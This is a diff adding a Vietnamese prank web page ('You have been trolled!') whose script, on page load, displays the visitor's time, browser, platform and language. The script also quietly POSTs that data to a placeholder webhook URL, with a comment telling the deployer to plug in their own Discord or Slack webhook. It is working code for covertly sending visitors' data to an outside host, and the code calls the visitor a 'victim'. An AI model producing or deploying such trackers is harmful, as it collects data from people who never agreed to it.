@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>😈 Bạn đã bị troll!</title>
+  <style>
+    body{
+      font-family: Arial, sans-serif;
+      text-align:center;
+      padding-top:50px;
+      background:#f9f9f9;
+    }
+    h1{
+      font-size:2.5rem;
+      margin-bottom:0.5em;
+    }
+    #info{
+      font-size:1.1rem;
+      line-height:1.5;
+    }
+  </style>
+  <script>
+    window.onload = () => {
+      const now = new Date();
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+
+      // Nội dung hiển thị cho "nạn nhân"
+      const infoHTML = `
+        <strong>Tôi biết bạn đang mở trang này lúc:</strong> ${now.toLocaleTimeString()}<br>
+        <strong>Bạn dùng trình duyệt:</strong> ${userAgent}<br>
+        <strong>Thiết bị của bạn:</strong> ${platform}<br>
+        <strong>Ngôn ngữ:</strong> ${language}<br>
+        <em>Hehe, bạn đã bị troll rồi! 🤣</em>
+      `;
+      document.getElementById("info").innerHTML = infoHTML;
+
+      // ---- GỬI TÍN HIỆU VỀ CHO BẠN ----
+      // Thay YOUR_WEBHOOK_URL bằng webhook của bạn (Discord, Slack, etc.)
+      fetch("YOUR_WEBHOOK_URL", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          time: now.toISOString(),
+          userAgent,
+          platform,
+          language
+        })
+      }).catch(err => console.log("Không gửi được webhook:", err));
+    };
+  </script>
+</head>
+<body>
+  <h1>😈 Bạn đã bị troll!</h1>
+  <p id="info">Đang thu thập thông tin...</p>
+</body>
+</html>
